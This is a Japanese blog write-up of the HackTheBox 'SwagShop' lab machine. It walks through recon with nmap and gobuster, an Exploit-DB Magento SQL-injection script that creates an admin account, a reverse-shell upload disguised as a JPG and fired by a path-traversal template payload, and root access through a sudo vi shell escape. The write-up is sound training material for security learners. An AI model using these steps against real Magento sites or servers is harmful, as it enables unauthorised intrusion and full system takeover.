# はじめに
HackTheBoxの攻略などを自分用にまとめたものです。  
主に記録用として記しています。  
<img src="http://www.hackthebox.eu/badge/image/185549" alt="Hack The Box">  
GitHub(ペネトレーションテスト用チートシート):  
https://github.com/yukitsukai47/PenetrationTesting_cheatsheet
Twitter:@yukitsukai1731

# SwagShop
![スクリーンショット 2020-08-26 16.15.54.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/40e5238b-4a71-dd7f-929f-dacfc302c22e.png)


HackTheBox公式より
SwagShop is an easy difficulty linux box running an old version of Magento. The version is vulnerable to SQLi and RCE leading to a shell. The www user can use vim in the context of root which can abused to execute commands.

SwagShopは、Magentoの古いバージョンを実行している簡単な難易度のlinuxのボックスです。バージョンは、SQLiとRCEシェルにつながる脆弱性があります。wwwのユーザーは、コマンドを実行するために悪用することができますルートのコンテキストでvimを使用することができます。

# Recon(偵察)
SwagShop(10.10.10.140)に対して、スキャンを行います。
まずnmapでスキャンを開始します。

## nmap 

```
nmap -sC -sV -oN nmap/initial 10.10.10.140
```

- -sC...デフォルトスクリプトでスキャン
- -sV...バージョン検出
- -oN...通常出力

```
# Nmap 7.80 scan initiated Tue Aug 25 23:17:57 2020 as: nmap -sC -sV -oN nmap/initial 10.10.10.140
Nmap scan report for 10.10.10.140
Host is up (0.25s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 25 23:18:56 2020 -- 1 IP address (1 host up) scanned in 59.28 seconds
```

この結果から80番ポートが空いていることが分かります。  
ブラウザからアクセスしてみると以下のようなmagentoを用いられて作成されたサイトが表示されます。  
サイトの下には「©2014 Magento Demo Store. All Rights Reserved.」と表記されていることが確認できます。
![スクリーンショット 2020-08-26 12.54.42.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/75c3d443-e2f0-9fc4-7d06-b07362876d23.png)

# gobuster
次に、gobusterを使用してディレクトリを検索します。

```
gobuster dir -t 25 -u http://10.10.10.117 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o initial -x php
```

- dir...dirモード
- -t...スレッド数
- -u...URL指定
- -w...ワードリスト指定
- -o...ファイル出力
- -x...拡張子指定

```
/media (Status: 301)
/index.php (Status: 200)
/includes (Status: 301)
/lib (Status: 301)
/install.php (Status: 200)
/app (Status: 301)
/js (Status: 301)
/api.php (Status: 200)
/shell (Status: 301)
/skin (Status: 301)
/cron.php (Status: 200)
/var (Status: 301)
/errors (Status: 301)
/mage (Status: 200)
/server-status (Status: 403)
```

# Exploitation(侵入)
先ほど、確認した「©2014 Magento Demo Store. All Rights Reserved.」という情報を利用して脆弱性が報告されていないか確認します。  
Googleを用いて「magento 2014 exploit」というワードで検索してみると、以下のようにいくつか情報がヒットします。
![スクリーンショット 2020-08-26 13.05.50.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/b39bcbe0-de7e-736d-bc35-7a0e8ba590dd.png)
searchsploitでexploitコードを落とします。

```
searchsploit -m xml/webapps/37977.py
mv 37977.py exploit.py
```

![スクリーンショット 2020-08-26 13.06.58.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/e849cd1d-4492-2caf-460e-b1e5917fd3f1.png)
落としてきたexploitコードのtarget部分を「http\://10.10.10.140/index.php」に変更し、要らない部分をコメントアウトします。
![スクリーンショット 2020-08-26 16.39.44.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/db0a27c6-ebb5-1fe4-4bb8-4f2fe28e0ce7.png)
実行すると、WORKEDという文字が表示され、  
ユーザー名:forme  
パスワード:forme  
というアカウントが作成されます。  
この情報を用いてmagentoの管理画面にアクセスします。(http://10.10.10.140/index.php/admin)

![スクリーンショット 2020-08-26 13.12.43.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/c6cfe7af-de13-2a9c-e9c4-15828b2acff2.png)
![スクリーンショット 2020-08-26 13.13.18.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/afdb79d6-b5aa-e58e-a528-84e35c184b7a.png)

次にファイルをアップロードできる機構がないか調べるため、Googleで「magento reverse shell」などのワードで検索すると、magentoで使用可能なFroghopper攻撃についての記載を見つけることができます。
https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper
![スクリーンショット 2020-08-26 16.13.04.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/013bda7c-6da9-9d26-a92e-682cb35452ca.png)
今回はこの手順に従って侵入を行います。

## Froghopper攻撃
①[System]-[Configuration]-[Advance]-[Developer]の「Template Settings」のAllow SymlinksをYesに変更してsave configを押下します。
![スクリーンショット 2020-08-26 16.24.42.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/e9e4cdd0-8d44-8e66-4c27-19574846f32a.png)

②[Catalog]-[Manage Categories]のGeneral Informationを通じてリバースシェルするためのファイルを送信します。  
今回、リバースシェルにはpentestmonkeyを使用しました。  
https://github.com/pentestmonkey/php-reverse-shell
php-reverse-shell.php内のipアドレスとポートを自身のマシンのものに変更します。
![スクリーンショット 2020-08-26 16.02.18.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/6c04522d-b3df-5d2f-716f-2ec8a2b9c982.png)
次に拡張子をjpgに変更し、rs.jpgという名前で保存しておきます。
![スクリーンショット 2020-08-26 16.03.01.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/d007db58-ce91-af1e-7178-c94fa6c010bc.png)
General Informationの部分を
Name:適当な名前
Is Active：Yesに変更
Image:先ほど作成したrs.jpgを指定
にしてからSave Categoryを押下します。
![スクリーンショット 2020-08-26 16.04.52.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/63872581-a7b8-9b15-f6fb-9075850d5f7e.png)
完了後、/media/catalog/category/にrs.jpgが配置されていることが確認できます。
![スクリーンショット 2020-08-26 16.05.03.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/e803ff16-89d7-fce6-24d4-66a53b50833d.png)

③[Newsletter]-[Newsletter Templates]-[Add New Template]からrs.jpgを発火させます。  
入力欄に下記のワードを入力し,右上の「Preview Template」を押下します。  
このとき、netcatを使用して通信を待ち受けておきます。

```
{{block type='core/template' template='../../../../../../media/catalog/category/rs.jpg'}}
```

![スクリーンショット 2020-08-26 16.06.04.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/9f147a14-6cfc-e127-eb3d-c383ce93bf43.png)
待ち受けていたnetcatにリバースシェルが接続されます。
![スクリーンショット 2020-08-26 16.06.46.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/62826631-2777-726a-22e0-f1d58c49d6e9.png)

# Privileges Escalation(権限昇格)
sudo -lで調べてみると現在のユーザで/usr/bin/vi /var/www/html/*をroot権限で動作させることができることが分かります。
![スクリーンショット 2020-08-26 16.08.40.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/8d06f89b-db3b-136b-09d8-0e45ca67525f.png)

```
sudo /usr/bin/vi /var/www/html/index.php
```

起動したvi内で下記のコマンドを実行します。

```
:!/bin/bash
```
![スクリーンショット 2020-08-26 16.08.40.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/447800/4ee3bc84-b6b2-d237-cbf0-7c5cd5eee06f.png)
これでroot権限を取得することができました。  
お疲れ様でした。
